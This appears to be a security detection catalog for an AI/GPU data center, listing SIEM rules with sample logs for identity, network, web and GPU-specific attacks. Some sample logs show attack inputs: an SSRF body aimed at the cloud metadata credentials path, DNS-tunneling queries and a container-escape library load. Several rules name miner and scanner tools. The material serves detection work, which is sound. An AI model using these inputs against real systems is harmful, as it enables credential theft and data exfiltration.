usecases.name: Password spray against SSO from a single source
usecases.description: Low-and-slow password guessing across many researcher and operator accounts, kept under lockout thresholds. One hit gives the attacker the SSO session in front of the GPU cluster portal, Slurm and MLOps tools.
usecases.detection: From one source IP or ASN, 15 or more distinct users fail with an invalid-password result (Entra 50126) within 30 minutes, at 3 or fewer attempts per user. Raise to Critical if any of those users then signs in successfully from the same IP within 60 minutes.
usecases.sample_log: {"createdDateTime":"2026-11-12T03:14:07Z","userPrincipalName":"m.chen@corp.example","appDisplayName":"GPU Cluster Portal","ipAddress":"203.0.113.45","clientAppUsed":"Browser","status":{"errorCode":50126,"failureReason":"Error validating credentials due to invalid username or password."},"location":{"city":"Amsterdam","countryOrRegion":"NL"},"riskLevelDuringSignIn":"medium","conditionalAccessStatus":"notApplied","correlationId":"6b2f1c9e-3a1d-4f2b-9c7e-1d2e3f4a5b6c"}

usecases.name: MFA fatigue (push bombing) followed by approval
usecases.description: An attacker who already has the password floods the user with push prompts until one is approved. This is a common way into GPU cloud admin consoles and AI platform tenants.
usecases.detection: 5 or more push challenges for one user within 10 minutes with 3 or more denials (user.mfa.okta_verify.deny_push), or a push approval that follows a burst of denials or comes from a new country or device.
usecases.sample_log: {"uuid":"8f3c2a10-87e1-11f1-9a2b-0b5d4c1e2f3a","published":"2026-11-12T22:41:09.512Z","eventType":"user.mfa.okta_verify.deny_push","displayMessage":"User rejected Okta push verify","severity":"WARN","actor":{"type":"User","alternateId":"r.patel@corp.example","displayName":"Ravi Patel"},"client":{"ipAddress":"198.51.100.23","geographicalContext":{"country":"Romania","city":"Bucharest"},"userAgent":{"rawUserAgent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}},"outcome":{"result":"FAILURE","reason":"User rejected Okta push verify"},"target":[{"type":"AppInstance","displayName":"GPU Cloud Admin Console"}]}

usecases.name: Kerberoasting of HPC and ML service accounts
usecases.description: RC4 service tickets requested for many SPNs let an attacker crack service-account passwords offline. In AI data centers these accounts often run Slurm, storage and MLOps services with broad rights.
log_sources: Windows Security Event Log on domain controllers (4769)
usecases.detection: One account requests TGS tickets for 10 or more distinct SPNs within 5 minutes with TicketEncryptionType 0x17 (RC4-HMAC), excluding krbtgt and computer accounts ending in $. Raise severity when the SPN belongs to a Tier-0 or GPU-platform service account.
usecases.sample_log: 2026-11-12T09:02:51.331Z DC02.corp.example Microsoft-Windows-Security-Auditing EventID=4769 Keywords="Audit Success" TargetUserName=a.kowalski@CORP.EXAMPLE ServiceName=svc-slurmdbd ServiceSid=S-1-5-21-3623811015-3361044348-30300820-1622 TicketOptions=0x40810000 TicketEncryptionType=0x17 IpAddress=::ffff:10.20.31.144 IpPort=50122 Status=0x0

usecases.name: DCSync replication request from a non-domain controller
usecases.description: A host that is not a domain controller requesting directory replication can pull every password hash, krbtgt included. That means control of the AD forest that gates cluster, storage and BMC access.
log_sources: Windows Security Event Log on domain controllers (4662)
usecases.detection: Event 4662 whose Properties contain DS-Replication-Get-Changes-All {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} or DS-Replication-Get-Changes {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}, where SubjectUserName is not a domain controller computer account or the approved directory-sync account.
usecases.sample_log: 2026-11-12T01:17:44.902Z DC01.corp.example Microsoft-Windows-Security-Auditing EventID=4662 Keywords="Audit Success" SubjectUserName=svc-backup SubjectDomainName=CORP SubjectLogonId=0x3E7A21C ObjectServer=DS ObjectType=%{19195a5b-6da0-11d0-afd3-00c04fd930c9} ObjectName=%{6c3f2a1b-8d4e-4f5a-9b6c-7d8e9f0a1b2c} OperationType="Object Access" AccessMask=0x100 Properties="%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}"

usecases.name: Member added to GPU platform or Tier-0 admin group
usecases.description: Membership in Domain Admins, GPU-Cluster-Admins or k8s-cluster-admins gives control of the cluster, its schedulers, and the model and data stores behind them.
usecases.detection: Membership added to a group tagged Tier-0 or GPU-platform-admin outside an approved change window, or by an account that is not on the identity-provisioning allow-list.
usecases.sample_log: 2026-11-12T14:33:10.118Z DC01.corp.example Microsoft-Windows-Security-Auditing EventID=4728 Keywords="Audit Success" Message="A member was added to a security-enabled global group." SubjectUserName=t.nguyen-adm MemberName="CN=Lee Wong,OU=Research,DC=corp,DC=example" TargetUserName=GPU-Cluster-Admins TargetDomainName=CORP TargetSid=S-1-5-21-3623811015-3361044348-30300820-4101

usecases.name: Root SSH to a GPU node that bypasses the PAM bastion
usecases.description: Privileged access to GPU nodes should go through the PAM jump host with session recording. A direct root login points to a stolen key, a misconfiguration, or someone avoiding oversight.
log_sources: Linux sshd and PAM logs (auth.log / journald)
PAM session logs (CyberArk PSM, Teleport, BeyondTrust)
usecases.detection: sshd "Accepted" for root or break-glass accounts where the source IP is outside the bastion CIDR, or a successful login with no matching PAM session start within 2 minutes.
usecases.sample_log:
Nov 12 02:47:31 dgx-b200-r07-n03 sshd[418827]: Accepted publickey for root from 10.40.12.88 port 53314 ssh2: ED25519 SHA256:q1V3nYkz8m0cPq0Ew1ZsS1o9pXkB4l8r2Jf7dTqvH2c
Nov 12 02:47:31 dgx-b200-r07-n03 sshd[418827]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)

usecases.name: Service account used for interactive logon
usecases.description: Service accounts for Slurm, MLflow, storage or CI should only authenticate non-interactively from known hosts. An RDP, console or TTY session usually means someone is using stolen service credentials.
usecases.detection: Accounts that match service naming (svc-*, sa-*) logging on with LogonType 2, 10 or 11, or getting an interactive TTY on Linux. Baseline the expected source hosts for each service account and alert on new ones.
usecases.sample_log: 2026-11-12T19:05:42.553Z JMP-ADM-02.corp.example Microsoft-Windows-Security-Auditing EventID=4624 Keywords="Audit Success" TargetUserName=svc-mlflow TargetDomainName=CORP LogonType=10 LogonProcessName=User32 AuthenticationPackageName=Negotiate WorkstationName=LT-RSRCH-118 IpAddress=10.20.44.118 IpPort=0 ElevatedToken=%%1842

usecases.name: Workload identity sign-in from an unfamiliar network
usecases.description: Service principals that autoscale GPU capacity or read model stores run from fixed egress IPs. A sign-in from somewhere new usually means a leaked client secret or certificate.
log_sources: Microsoft Entra ID service principal sign-in logs
GCP Cloud Audit Logs (STS token exchange)
usecases.detection: Service principal authentication from an IP or ASN not seen in the last 30 days, or from outside the data-center and CI egress ranges. Critical if the principal holds Owner or Contributor on GPU subscriptions or can read Key Vault.

usecases.name: Long-lived API key used from a new network or anonymizer
usecases.description: API keys for inference endpoints, NGC, Hugging Face and internal model registries tend to end up in notebooks and repos. Use from a new ASN, a Tor exit or a hosting provider points to a leaked key.
log_sources: API gateway access logs (Kong, Apigee, Envoy)
usecases.detection: Requests authenticated with a key ID from an IP or ASN outside its 30-day baseline, or from IPs that threat intel flags as Tor or VPN exits. Correlate with secret-scanning alerts for the same key and with keys older than 90 days.

usecases.name: Federation or identity provider trust modified
usecases.description: Changing domain federation settings or adding a new identity provider lets an attacker mint tokens for any user (Golden SAML style) and skip MFA on every federated app.
usecases.detection: Audit events "Set federation settings on domain", "Set domain authentication", or a new IdP or token-signing certificate, outside an approved change. Always investigate the initiating identity and its source IP.

usecases.name: LDAP reconnaissance burst from a workstation
usecases.description: Collectors such as SharpHound pull users, groups, SPNs and ACLs to map attack paths toward cluster admins.
log_sources: Active Directory Directory Service log (1644 expensive-search logging)
usecases.detection: One client issues 500 or more LDAP searches in 5 minutes, or domain-wide searches for servicePrincipalName=*, adminCount=1 or (objectClass=*), from a host that is not an admin or identity-management server.
usecases.sample_log: 2026-11-12T10:12:09.004Z DC02.corp.example Microsoft-Windows-ActiveDirectory_DomainService EventID=1644 Category="Field Engineering" Client=10.20.31.144:53012 StartingNode="DC=corp,DC=example" Filter="( & (objectCategory=person) (servicePrincipalName=*) )" SearchScope=subtree AttributeSelection="samaccountname,serviceprincipalname,admincount" EntriesVisited=48211 EntriesReturned=412 User=CORP\a.kowalski

usecases.name: Emergency (break-glass) account sign-in
usecases.description: Break-glass accounts skip normal controls and should almost never be used. Every sign-in needs to match a declared incident.
usecases.detection: Any successful or failed sign-in by an account on the break-glass watchlist. Critical when no incident or change ticket is open, or when the sign-in comes from outside the documented recovery workstations.

usecases.name: Privileged credential checkout spike or checkout without a ticket
usecases.description: Pulling many root, BMC, switch or HSM credentials from the vault in a short window, or with no ticket, often comes before a hands-on-keyboard intrusion or insider sabotage.
log_sources: Delinea Secret Server / HashiCorp Vault audit
usecases.detection: One user retrieves 10 or more privileged accounts in 1 hour, or retrieves BMC, InfiniBand/NVSwitch or HSM credentials with an empty reason or no matching change ticket.
usecases.sample_log: Nov 12 03:05:18 vault01 CEF:0|Cyber-Ark|Vault|14.2.0000|295|Retrieve password|5|act=Retrieve password suser=l.wong fname=Root\\Operating System-Redfish-dgx-b200-r07-n03-bmc-admin dvc=10.10.5.20 shost=10.20.44.118 dhost=dgx-b200-r07-n03-bmc duser=admin reason= cs2Label="Safe Name" cs2=GPU-BMC-Credentials cs3Label="Device Type" cs3=Operating System

usecases.name: Conditional Access or sign-on policy disabled or weakened
usecases.description: Switching off the policies that enforce MFA, compliant devices or location limits for GPU platform admins opens the door to token replay and password-only access.
log_sources: Okta System Log (policy lifecycle and rule events)
usecases.detection: A Conditional Access policy deleted, set to disabled or report-only, or given new user or app exclusions, especially policies scoped to admin roles, GPU subscriptions or "All users".
usecases.sample_log: {"activityDateTime":"2026-11-12T21:12:44Z","activityDisplayName":"Update conditional access policy","category":"Policy","result":"success","loggedByService":"Conditional Access","initiatedBy":{"user":{"userPrincipalName":"t.nguyen-adm@corp.example","ipAddress":"10.20.9.14"}},"targetResources":[{"type":"Policy","displayName":"CA001 - Require MFA for GPU platform admins","modifiedProperties":[{"displayName":"ConditionalAccessPolicy","oldValue":"{\"state\":\"enabled\"}","newValue":"{\"state\":\"disabled\"}"}]}]}

usecases.name: New secret or certificate added to an app registration
usecases.description: Adding credentials to an existing app registration keeps the attacker in with that app's permissions (for example GPU subscription contributor or storage reader), even after every user password is reset.
usecases.detection: "Add service principal credentials" or "Update application – Certificates and secrets management" where the actor is not an app owner or the CI pipeline identity, or the app holds high-privilege roles.

usecases.name: Internet-to-AI control plane session allowed by the firewall
usecases.description: Ray dashboards, Jupyter, MLflow, Triton, vLLM, the Kubernetes API and BMC interfaces are often exposed by mistake. Exposed instances get scanned and exploited within hours, as the ShadowRay campaign showed.
log_sources: Next-generation firewall traffic logs (Palo Alto, Fortinet, Check Point)
usecases.detection: Any allowed session from untrust or internet zones to the AI control-plane port list (6443, 8265, 10001, 8888, 5000, 8000-8002, 9400, 623/udp, or 443 on BMC ranges), or to hosts tagged ai-mgmt in the CMDB.

usecases.name: GPU node resolving or connecting to cryptomining pools
usecases.description: GPU nodes are prime mining targets. Stratum connections or pool lookups from training and inference subnets mean hijacked compute, and usually an earlier compromise.
usecases.detection: DNS queries from GPU subnets that match mining-pool threat intel or patterns (*pool*, *2miners*, *nanopool*, *herominers*), or TCP sessions to common Stratum ports (3333, 4444, 5555, 7777, 14444), or payloads containing "mining.subscribe".

usecases.name: DNS tunneling from training or storage subnets
usecases.description: Long, high-entropy subdomains and bursts of TXT or NULL queries to one domain are a quiet way to move tokens, configs or small model artifacts past egress controls.
log_sources: DNS server query logs (BIND, Infoblox, Windows DNS analytical)
usecases.detection: For one registered domain, more than 200 unique subdomains per hour from a single host, an average label length above 40 characters with high Shannon entropy, or a TXT/NULL share above 50% of queries.
usecases.sample_log: 12-Nov-2026 04:22:31.512 queries: info: client @0x7f9b1c0a2b40 10.60.2.41#53122 (mzxw6ytboi2dqnbsgezdgmjr.gq3tsnzrgm2dkmrz.x7.cdn-sync.example.net): query: mzxw6ytboi2dqnbsgezdgmjr.gq3tsnzrgm2dkmrz.x7.cdn-sync.example.net IN TXT +E(0)K (10.10.0.53)

usecases.name: Large outbound transfer from GPU or storage networks
usecases.description: Model weights, checkpoints and curated datasets run to hundreds of gigabytes. Sustained egress from training, storage or checkpoint subnets to an unknown destination is the clearest network sign of IP theft.
usecases.detection: More than 20 GB in 1 hour from GPU, storage or checkpoint VLANs to destinations outside the egress allow-list, or a first-seen destination receiving more than 5 GB. Suppress approved replication and backup targets.
usecases.sample_log:
Date first seen          Duration Proto      Src IP Addr:Port          Dst IP Addr:Port   Flags Tos  Packets    Bytes Flows
2026-11-12 05:01:13.221  3599.870 TCP      10.60.2.41:44012  ->   198.51.100.200:443   .AP.SF   0   71.2 M   98.1 G     1

usecases.name: VPN session from impossible travel or a first-seen country
usecases.description: Remote access into the data-center network from two distant places in a short time, or from a country the user has never connected from, points to a stolen VPN credential or session.
log_sources: VPN concentrator logs (Cisco ASA/FTD, GlobalProtect, FortiGate, Ivanti)
usecases.detection: The same user with VPN sessions from two geolocations implying travel faster than 900 km/h, a country not seen in the last 90 days, or more than 2 concurrent sessions from different public IPs.
usecases.sample_log:
Nov 12 2026 06:40:02 asa-vpn-01 : %ASA-6-113039: Group <GP-Research> User <j.doe> IP <203.0.113.9> AnyConnect parent session started.
Nov 12 2026 06:40:03 asa-vpn-01 : %ASA-4-722051: Group <GP-Research> User <j.doe> IP <203.0.113.9> IPv4 Address <10.250.8.44> IPv6 address <::> assigned to session

usecases.name: ZTNA access denied across several sensitive apps
usecases.description: Repeated policy or device-posture denials across BMC consoles, Kubernetes dashboards and scheduler portals show someone probing what a stolen identity or an unmanaged device can reach.
log_sources: ZTNA access logs (Zscaler ZPA, Cloudflare Access, Netskope Private Access)
usecases.detection: 10 or more denials for one user across 3 or more apps tagged gpu-admin within 15 minutes, or any access attempt to those apps from a device that fails posture checks.

usecases.name: East-west scanning or SSH fan-out from a GPU node
usecases.description: A compromised training node that starts touching dozens of peers over SSH, SMB, WinRM, the Kubernetes API or the kubelet is moving laterally across a flat, high-trust cluster network.
log_sources: Cilium Hubble or VPC flow logs
usecases.detection: One source connecting to 25 or more distinct internal hosts on 22, 445, 5985, 6443 or 10250 within 10 minutes, or to 100 or more distinct ports on one host. Exclude config-management controllers and vulnerability scanners.

usecases.name: Periodic beaconing to a rare external domain
usecases.description: Implants on GPU nodes and jump hosts call home on a near-fixed interval. Low jitter to a domain no other host talks to is a strong command-and-control signal, even over TLS.
usecases.detection: One internal host making 50 or more connections in 24 hours to a destination seen by 3 or fewer internal hosts, with an inter-arrival coefficient of variation below 0.2 and similar payload sizes.

usecases.name: Firewall rule opened to any-any into GPU or management zones
usecases.description: Temporary "allow any" rules into BMC, fabric-management or Kubernetes control-plane zones tend to stay, and they are a common way attackers widen access once they hold firewall admin rights.
log_sources: NGFW configuration / audit logs (Palo Alto CONFIG, FortiGate event logs)
usecases.detection: A security rule created or edited where source, destination or application is "any" and the destination zone is bmc, fabric-mgmt, k8s-control or gpu-prod, or any rule commit outside the approved change window.
usecases.sample_log: <14>Nov 12 22:15:44 pa-core-01 1,2026/11/12 22:15:44,013201001234,CONFIG,0,2049,2026/11/12 22:15:44,10.20.9.14,vsys1,set,netadmin02,Web,Succeeded, vsys  vsys1 rulebase security rules  temp-allow-any,7302150,0x0,0,0,0,0,,pa-core-01

usecases.name: DNS-over-HTTPS or Tor egress from data-center hosts
usecases.description: Servers that bypass the corporate resolver with DoH, or reach Tor, blind DNS-based detections. They are often running malware or tooling that wants to hide its infrastructure.
usecases.detection: App-ID dns-over-https, tor or tor2web from server subnets, or HTTPS to well-known public DoH endpoints (1.1.1.1, 8.8.8.8, 9.9.9.9 on 443) from GPU, storage or management networks.

usecases.name: WAF injection attempts followed by a successful response
usecases.description: Scanners hammer AI portals, model catalogs and MLOps UIs with SQLi, RCE and path-traversal payloads. A run of blocks that ends in a 200 on the same path often means the attacker found a bypass.
log_sources: WAF logs (AWS WAF, Cloudflare, F5 Advanced WAF, ModSecurity)
usecases.detection: 20 or more blocked requests from one client within 10 minutes followed by an allowed 2xx from the same client to the same URI path, or any request with a known scanner user agent (sqlmap, nuclei, ffuf) reaching an origin.

usecases.name: Credential stuffing against the AI portal login
usecases.description: Botnets replay breached username and password pairs against customer and researcher portals. A takeover hands over API keys, GPU credits and private models.
log_sources: Bot management / CDN logs (Cloudflare, Akamai, F5 Distributed Cloud)
usecases.detection: On login endpoints, a failure ratio above 80% across 50 or more accounts from 20 or more IPs that share a TLS fingerprint (JA4) or user agent within 15 minutes, or bot score below 30 on POST /auth/login.

usecases.name: Object ID enumeration against model and project APIs (BOLA)
usecases.description: Walking sequential project, model or dataset IDs with one token tests whether the API checks object ownership. One missing check exposes other tenants' weights and data.
log_sources: API gateway access logs (Kong, Apigee, AWS API Gateway, Envoy)
usecases.detection: One consumer or token requesting 100 or more distinct object IDs on /projects/*, /models/* or /datasets/* within 10 minutes with more than 50% 403/404 responses, or with sequentially incrementing IDs.

usecases.name: Layer-7 flood against inference endpoints
usecases.description: Every LLM request holds GPU memory and batch slots. A modest request flood, or a handful of huge prompts, can exhaust a serving fleet that would shrug off the same rate of ordinary web traffic.
log_sources: Load balancer access logs (AWS ALB, F5, NGINX, Envoy)
Inference server metrics (queue depth, KV-cache usage)
usecases.detection: Requests per second to /v1/completions or /v1/chat/completions above 5x the 7-day baseline with more than 20% 5xx, or GPU queue saturation where 80% of requests come from 5 or fewer ASNs.

usecases.name: Internal-only endpoints reachable through the public ingress
usecases.description: Inference and MLOps services expose /metrics, /debug/pprof, model-repository and admin routes that leak internals or allow control actions. They should never answer requests that arrive through the public ingress.
log_sources: Reverse proxy / ingress access logs (NGINX, Envoy, Traefik, HAProxy)
usecases.detection: External client IPs receiving 2xx on internal path patterns (/metrics, /debug/, /v2/repository, /actuator, /admin, /api/v1/status) at the public ingress, or more than 50 distinct 404 paths per client (wordlist scanning).
usecases.sample_log:
203.0.113.17 - - [12/Nov/2026:10:44:03 +0000] "GET /debug/pprof/goroutine?debug=2 HTTP/1.1" 200 88213 "-" "curl/8.5.0" rt=0.004 upstream=10.70.5.14:8080 host="inference.ai.corp.example"
203.0.113.17 - - [12/Nov/2026:10:44:05 +0000] "POST /v2/repository/index HTTP/1.1" 200 1422 "-" "curl/8.5.0" rt=0.011 upstream=10.70.5.14:8000 host="inference.ai.corp.example"

usecases.name: SSRF toward cloud metadata through URL-fetching AI features
usecases.description: RAG connectors, "summarize this URL" features and agent web tools fetch attacker-chosen URLs. Pointing them at 169.254.169.254 or internal services steals instance credentials or maps the internal network.
log_sources: WAF logs (ModSecurity / OWASP CRS, AWS WAF)
usecases.detection: Requests whose parameters or JSON bodies contain link-local, loopback or RFC 1918 targets (169.254.169.254, metadata.google.internal, 127.0.0.1, 10.0.0.0/8), CRS rule 934110 hits, or fetch-tool logs that resolve to internal addresses.
usecases.sample_log: {"transaction":{"client_ip":"198.51.100.42","time_stamp":"Thu Nov 12 11:02:17 2026","host_ip":"10.70.4.12","request":{"method":"POST","uri":"/api/tools/fetch","headers":{"host":"assistant.ai.corp.example","content-type":"application/json"},"body":"{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"},"response":{"http_code":403},"messages":[{"message":"Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter","details":{"ruleId":"934110","file":"REQUEST-934-APPLICATION-ATTACK-GENERIC.conf","data":"Matched Data: 169.254.169.254 found within ARGS_JSON:url","severity":"2","tags":["attack-ssrf","paranoia-level/1"]}}]}}

usecases.name: Direct-to-origin traffic that skips the WAF or CDN
usecases.description: If the origin for portal or inference endpoints accepts traffic that did not come through the CDN or WAF, every edge control (bot management, rate limits, WAF rules) can be bypassed.
log_sources: Origin load balancer / reverse proxy access logs
usecases.detection: Requests at the origin whose client IP is outside the published CDN/WAF egress ranges, or that lack the shared origin-authentication header or mTLS client certificate.

usecases.name: Forged or replayed JWTs at the API gateway
usecases.description: Bursts of signature failures, alg=none tokens, unknown key IDs or expired-token replays against inference APIs show attempts to forge or reuse bearer tokens.
log_sources: API gateway / Envoy JWT authentication logs
usecases.detection: 20 or more JWT verification failures from one client in 5 minutes, any token with alg "none" or a kid not in the JWKS, or a token jti seen from more than 3 distinct IPs.

usecases.name: Cryptomining on GPUs (sustained load with no scheduled job)
usecases.description: Mining shows up as GPUs pinned near 100% SM utilization and high power draw with no Slurm job or Kubernetes pod allocated, or as compute processes named like known miners.
usecases.detection: DCGM_FI_DEV_GPU_UTIL above 90% for more than 30 minutes on a GPU with empty pod/namespace labels and no active Slurm job, or a GPU process name matching miner signatures (xmrig, t-rex, lolminer, nbminer, gminer, teamredminer).

usecases.name: Critical GPU Xid errors (fallen off bus, uncorrectable ECC, NVLink)
usecases.description: Xid errors in the NVIDIA kernel driver flag GPUs that have stopped responding, lost memory integrity or dropped NVLink. They take down multi-node training jobs. A sudden cluster of them can also point to tampering, firmware problems or deliberately malformed kernels.
log_sources: Linux kernel log (dmesg / journald, NVRM messages)
usecases.detection: Any Xid in 48, 63, 64, 74, 79, 92, 94, 95, 119 or 120 opens an incident against the node. Repeated Xid 13, 31 or 43 on the same GPU within an hour, tied to a single user's jobs, deserves a security look.
usecases.sample_log:
Nov 12 04:31:07 dgx-h100-r04-n11 kernel: NVRM: GPU at PCI:0000:9b:00: GPU-8f2c1a7e-5b3d-4e9f-a1c2-7d6e5f4a3b21
Nov 12 04:31:07 dgx-h100-r04-n11 kernel: NVRM: GPU Board Serial Number: 1652023012345
Nov 12 04:31:07 dgx-h100-r04-n11 kernel: NVRM: Xid (PCI:0000:9b:00): 79, pid='<unknown>', name=<unknown>, GPU has fallen off the bus.
Nov 12 04:31:07 dgx-h100-r04-n11 kernel: NVRM: GPU 0000:9b:00.0: GPU has fallen off the bus.

usecases.name: GPU driver or kernel module loaded from an unexpected path
usecases.description: The NVIDIA driver modules (nvidia, nvidia_uvm, nvidia_peermem, nvidia_drm) run in ring 0 with access to all GPU memory. Loading unsigned or out-of-path modules, or drifting from the golden driver version, is a rootkit-grade event.
usecases.detection: finit_module or init_module of any .ko from /tmp, /home or /dev/shm, a "module verification failed" taint on a GPU node, or a DCGM_FI_DRIVER_VERSION that differs from the node image's golden version.
usecases.sample_log:
type=SYSCALL msg=audit(1794460802.412:88231): arch=c000003e syscall=313 success=yes exit=0 a0=3 a1=55d1c2f0a2b0 a2=0 a3=0 items=1 ppid=771180 pid=771203 auid=1042 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts1 ses=412 comm="insmod" exe="/usr/bin/kmod" key="kernel_modules"
type=PATH msg=audit(1794460802.412:88231): item=0 name="/tmp/.x/nvidia-peermem.ko" inode=1835071 dev=08:02 mode=0100644 ouid=1042 ogid=1042 rdev=00:00 nametype=NORMAL
Nov 12 05:20:02 dgx-h100-r04-n11 kernel: nvidia_peermem: module verification failed: signature and/or required key missing - tainting kernel

usecases.name: MIG layout changed outside the automation pipeline
usecases.description: Multi-Instance GPU partitions are an isolation boundary between tenants and teams. Hand-made MIG changes can break isolation assumptions, strand capacity, or set up co-location with a victim workload.
log_sources: NVIDIA MIG Manager / GPU Operator logs
usecases.detection: nvidia-smi mig -cgi, -dgi, -cci or -dci, or "nvidia-smi -mig 0|1", run by anyone other than the MIG manager service account, or a change to the nvidia.com/mig.config node label outside a change window.
usecases.sample_log:
type=EXECVE msg=audit(1794488712.031:91234): argc=7 a0="nvidia-smi" a1="mig" a2="-i" a3="2" a4="-cgi" a5="19,19,19,19,19,19,19" a6="-C"
type=SYSCALL msg=audit(1794488712.031:91234): arch=c000003e syscall=59 success=yes exit=0 ppid=90122 pid=90188 auid=1042 uid=0 gid=0 euid=0 tty=pts3 ses=97 comm="nvidia-smi" exe="/usr/bin/nvidia-smi" key="gpu_admin"

usecases.name: GPU Operator ClusterPolicy or device plugin tampering
usecases.description: The GPU Operator ClusterPolicy controls the driver, device plugin, container toolkit and DCGM exporter on every GPU node. Pointing an image at an untrusted registry, or switching off the DCGM exporter, compromises or blinds the whole fleet at once.
usecases.detection: update or patch on clusterpolicies.nvidia.com, or on DaemonSets in the gpu-operator namespace, by any identity other than the GitOps controller. Also alert on image repositories outside the approved registry list and on dcgmExporter.enabled=false.

usecases.name: GPU telemetry gap (DCGM exporter or host engine down)
usecases.description: Mining, unscheduled jobs and thermal sabotage are all detected through GPU telemetry. A node whose DCGM exporter or nv-hostengine goes quiet becomes a blind spot, whether from an outage or a deliberate act.
usecases.detection: up{job="dcgm-exporter"} == 0 for more than 10 minutes on a node that is still running workloads, or nv-hostengine stopped outside maintenance. Correlate with GPU-005 and with a recent privileged login on the node.
usecases.sample_log: {"receiver":"siem-webhook","status":"firing","alerts":[{"status":"firing","labels":{"alertname":"DCGMExporterDown","instance":"dgx-h100-r04-n11:9400","job":"dcgm-exporter","severity":"warning","cluster":"train-east-1"},"annotations":{"summary":"dcgm-exporter target down for 10m while node has 8 allocated GPUs"},"startsAt":"2026-11-12T13:03:15.000Z","generatorURL":"http://prometheus.mon.corp.example/graph?g0.expr=up%7Bjob%3D%22dcgm-exporter%22%7D%3D%3D0"}]}

usecases.name: GPU compute process running outside any scheduler allocation
usecases.description: Every GPU process should belong to a Slurm job step or a Kubernetes pod. A process in a user session cgroup is shadow usage: an insider skipping quotas, a leftover process, or an attacker's workload.
usecases.detection: A GPU compute PID whose cgroup does not match /system.slice/slurmstepd.scope/job_* or a kubepods slice, held for more than 10 minutes or more than 10 GiB of GPU memory.

usecases.name: GPU performance-counter restriction disabled on shared nodes
usecases.description: NVIDIA drivers restrict GPU profiling counters to admins (NVreg_RestrictProfilingToAdminUsers=1) because the counters can leak information about co-tenant workloads. Turning the restriction off on shared nodes opens that side channel.
usecases.detection: Any change to /etc/modprobe.d/*nvidia* that sets NVreg_RestrictProfilingToAdminUsers=0, or ncu, nsys or cuda-gdb run by non-admins on multi-tenant GPU nodes.

usecases.name: GPU VBIOS or firmware version drift without a change ticket
usecases.description: GPU VBIOS, InfoROM and baseboard firmware should match the fleet baseline and change only through signed vendor updates. Unexplained drift points to tampering, gray-market parts or an unauthorized flashing tool.
usecases.detection: VBIOS, InfoROM or GPU firmware version on any node differs from the approved baseline for that SKU, with no matching maintenance ticket. Also alert on firmware tools run outside maintenance windows.
usecases.sample_log: 2026-11-12T00:05:00Z inventory-collector host=dgx-h100-r04-n11 gpu=GPU-8f2c1a7e-5b3d-4e9f-a1c2-7d6e5f4a3b21 serial=1652023012345 field=vbios_version expected=96.00.99.00.01 observed=96.00.A1.00.07 driver=570.172.08 change_ticket=none

usecases.name: GPU power or clock limits lowered outside policy
usecases.description: Lowering power limits or locking clocks on a training cluster quietly cuts throughput across a whole job. That is a low-noise way to sabotage or slow a competitor's or tenant's work.
usecases.detection: DCGM_FI_DEV_POWER_MGMT_LIMIT or application clocks changed on production GPUs by anyone other than the power-capping service, or a drop of more than 30% from the SKU default.
usecases.sample_log:
type=EXECVE msg=audit(1794496211.118:92011): argc=5 a0="nvidia-smi" a1="-i" a2="0,1,2,3,4,5,6,7" a3="-pl" a4="300"
DCGM_FI_DEV_POWER_MGMT_LIMIT{gpu="0",Hostname="dgx-h100-r04-n11",modelName="NVIDIA H100 80GB HBM3"} 300

usecases.name: Container escape attempt through the NVIDIA Container Toolkit hook
usecases.description: CVE-2024-0132 and CVE-2025-23266 showed that a crafted container image can make the NVIDIA Container Toolkit hook, which runs on the host, load attacker code and take over the GPU node. On shared clusters that means cross-tenant access to models and data.
usecases.detection: A host-side nvidia-ctk or nvidia-container-runtime-hook process opening a shared library from a container rootfs path or /proc/self/cwd, or pods on GPU nodes that set LD_PRELOAD in their env. Also flag nodes running a toolkit older than the fixed release (1.17.8 or later).
usecases.sample_log: {"time":"2026-11-12T15:41:27.882104511Z","rule":"GPU container hook loads library from container rootfs","priority":"Critical","source":"syscall","hostname":"dgx-h100-r04-n11","output":"Host hook process loaded library from container path (proc.name=nvidia-ctk proc.cmdline=nvidia-ctk hook update-ldcache fd.name=/proc/self/cwd/poc.so container.image=registry.example.net/research/finetune:latest k8s.ns=team-vision k8s.pod=finetune-7d9f-xk2pq)","output_fields":{"proc.name":"nvidia-ctk","fd.name":"/proc/self/cwd/poc.so","container.image.repository":"registry.example.net/research/finetune","k8s.ns.name":"team-vision","k8s.pod.name":"finetune-7d9f-xk2pq"},"tags":["custom","gpu","T1611"]}

usecases.name: GPU confidential-computing attestation failure
usecases.description: Nodes that run confidential AI workloads in GPU CC mode must pass remote attestation of the driver and VBIOS measurements before secrets or models are released to them. A failed or skipped attestation means the trust chain is broken.
log_sources: NVIDIA Remote Attestation Service (NRAS) / local verifier logs
usecases.detection: Any attestation result other than success for a GPU in CC mode, measurement comparison failures, or a key-broker release to a node with no successful attestation in the last 24 hours.

usecases.name: InfiniBand partition key (P_Key) violations
usecases.description: InfiniBand partitions separate tenants and storage traffic on the GPU fabric. Bad P_Key traps and rising constraint-error counters show a host trying to talk outside its partition.
usecases.detection: Any Bad P_Key or Bad Q_Key trap (notice 257/258), or PortRcvConstraintErrors / PortXmitConstraintErrors increasing on ports that face compute nodes. Resolve the LID and port to a host and tenant.
usecases.sample_log:
Nov 12 06:12:44 ufm-01 opensm[3021]: osm_trap_rcv_process_request: Received Generic Notice type:1 num:257 (Bad P_Key) Producer:2 (Switch) from LID:0x01A4 TID:0x00000000000004d2
# Port counters: Lid 420 port 14 (CapMask: 0x5A00)
PortRcvConstraintErrors:.........412
PortXmitConstraintErrors:........0

usecases.name: Rogue subnet manager takes over the InfiniBand fabric
usecases.description: The master subnet manager programs routing and partitions for the whole InfiniBand fabric. A compute node that starts OpenSM with a high priority can take over, then redirect or join any partition.
usecases.detection: A master SM GUID that is not on the approved UFM/SM list, any SM state change to MASTER from a compute node, or an opensm process running on hosts outside the fabric-management group.
usecases.sample_log:
Nov 12 06:30:02 dgx-h100-r04-n11 OpenSM[88412]: Entering MASTER state
